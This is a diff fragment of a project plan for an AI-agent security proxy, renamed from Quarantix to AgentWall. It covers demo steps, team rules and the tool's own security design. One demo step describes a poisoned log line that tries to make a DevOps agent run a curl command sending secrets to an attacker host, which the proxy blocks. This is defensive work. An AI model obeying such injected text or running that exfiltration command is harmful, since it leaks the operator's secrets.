   4. *Any domain:* the DevOps agent through the proxy. A poisoned log line tries `curl attacker…$(cat secrets)` → blocked. (30 s)
   5. *Results:* table with intervals: baseline vs guard vs full. (20 s)
-  6. *Close:* "Detectors guess. Quarantix enforces." Hand judges the Attack lab. (20 s)
+  6. *Close:* "Detectors guess. AgentWall enforces." Hand judges the Attack lab. (20 s)
 - [ ] **Mentor demo (5 min):** diagram → the 10-line `run_support_guarded.py` → terminal + live events → policy edit propagates < 1 s → remote approval → kill API, still blocked → monitor mode as the on-ramp for real deployments.
 - [ ] **Record the backup video** of the judge demo (1080p, under 3:10).
 
@@ -1249,7 +1249,7 @@ Each shortcut sits behind an interface, so the architecture stays the same.
 - Never commit `.env` or keys (pre-commit `detect-secrets`). Cassettes **are** committed. They contain only fake-world data, never real secrets.
 - Contract changes (§5) need a team heads-up, a `schema_version` bump and regenerated TS types.
 
-### Security of Quarantix itself
+### Security of AgentWall itself
 
 - Planner and reader output is untrusted input: schema-validated, statically checked, and limits enforced.
 - The reader has no tool access (import-linter). In production it runs in a process with no network route to tool endpoints.
